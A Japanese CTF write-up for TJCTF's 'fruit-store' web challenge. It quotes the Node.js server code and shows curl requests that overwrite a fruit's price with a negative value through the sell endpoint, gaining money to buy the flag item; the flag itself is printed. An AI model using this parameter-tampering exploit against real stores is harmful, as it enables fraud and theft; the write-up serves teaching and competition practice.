# fruit-store:web:287pts
:lemonthink:  
[Instancer](https://instancer.tjctf.org/fruit-store)  

Downloads  
[server.zip](server.zip)  

# Solution
ソースとインスタンス生成リンクが渡される。  
生成しアクセスするとフルーツを購入できるサイトのようだ。  
Fruit Shop  
[site.png](site/site.png)  
購入以外できないと思われ、超高額なgrassを買えばよさそうだ。  
次にソースを見る。  
```js
~~~
fruits['grass'] = {
    name: 'grass',
    price: 2.5e+25,
    description: fs.readFileSync('flag.txt', 'utf8').trim(),
    quantity: 1
};
~~~
app.post('/api/v1/sell', (req, res) => {
    for (const [key, value] of Object.entries(req.body)) {
        if (key === 'grass' && !req.session.admin) {
            continue;
        }

        if (!fruits[key]) {
            fruits[key] = JSON.parse(JSON.stringify(fruit));
        }

        for (const [k, v] of Object.entries(value)) {
            if (k === 'quantity') {
                fruits[key][k] += v;
            } else {
                fruits[key][k] = v;
            }
        }
    }

    res.send('Sell successful');
});

app.post('/api/v1/buy', (req, res) => {
    const { fruit, quantity } = req.body;

    if (typeof fruit === 'undefined' || typeof quantity !== 'number' || quantity <= 0 || !fruits[fruit]) {
        return res.status(400).send('Invalid request');
    }

    if (fruits[fruit].quantity >= quantity) {
        if (req.session.money >= fruits[fruit].price * quantity) {
            fruits[fruit].quantity -= quantity;
            req.session.money -= fruits[fruit].price * quantity;
            res.json(fruits[fruit]);
        } else {
            res.status(402).send('Not enough money');
        }
    } else {
        res.status(451).send('Not enough fruit');
    }
});
~~~
```
`/api/v1/sell`で売ることができるようだ。  
ただし、grassはブロックされている。  
adminのみお金を増やせるなどの処理があるが、あまり関係はない。  
所持数を確認していないため、無限にフルーツを売りつけることができるが、お金が増えることはない。  
ここでソースの以下の部分に注目する。  
```js
~~~
        for (const [k, v] of Object.entries(value)) {
            if (k === 'quantity') {
                fruits[key][k] += v;
            } else {
                fruits[key][k] = v;
            }
        }
~~~
```
商品の個数を追加しているが、`quantity`以外のキーを指定するとvに書き換えることができる。  
これで商品のnameやpriceなどが任意の値に変更できるようになった。  
さらに購入処理の以下の部分に注目する。  
```js
~~~
        if (req.session.money >= fruits[fruit].price * quantity) {
            fruits[fruit].quantity -= quantity;
            req.session.money -= fruits[fruit].price * quantity;
~~~
```
自身の所持金からフルーツ代金*購入量を引いている。  
つまりフルーツ代金をマイナスにするとお金が増えることがわかる。  
よって以下の通り、sellするタイミングでpriceをマイナスにし、それを購入することで所持金を増やしgrassを買えばよい。  
今回は在庫があるbananaの代金をマイナスにした。  
```bash
$ curl -X POST 'https://fruit-store-16ac1ecab524d650.tjc.tf/api/v1/sell' -H 'Content-Type: application/json' -H 'Cookie: connect.sid=s%3AQ-jvlbKwnUCNiMsiK09bLo7BcCqHuhey.rTsHWm1SpJX39O9itN%2Fjd6vZvJ0FsRHWdn86gKJrfzk' -d '{"banana": {"price":-10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000}}'
Sell successful
$ curl -X POST 'https://fruit-store-16ac1ecab524d650.tjc.tf/api/v1/buy' -H 'Content-Type: application/json' -H 'Cookie: connect.sid=s%3AQ-jvlbKwnUCNiMsiK09bLo7BcCqHuhey.rTsHWm1SpJX39O9itN%2Fjd6vZvJ0FsRHWdn86gKJrfzk' -d '{"fruit":"banana","quantity":1}'
{"name":"banana","price":-1e+100,"description":"banannananananannana","quantity":4}
$ curl -X POST 'https://fruit-store-16ac1ecab524d650.tjc.tf/api/v1/buy' -H 'Content-Type: application/json' -H 'Cookie: connect.sid=s%3AQ-jvlbKwnUCNiMsiK09bLo7BcCqHuhey.rTsHWm1SpJX39O9itN%2Fjd6vZvJ0FsRHWdn86gKJrfzk' -d '{"fruit":"grass","quantity":1}'
{"name":"grass","price":2.5e+25,"description":"tjctf{h4v3_y0u_ev3r_tri3d_gr4s5_j3l1y_d4ebd9}","quantity":0}
```
flagが得られた。  

## tjctf{h4v3_y0u_ev3r_tri3d_gr4s5_j3l1y_d4ebd9}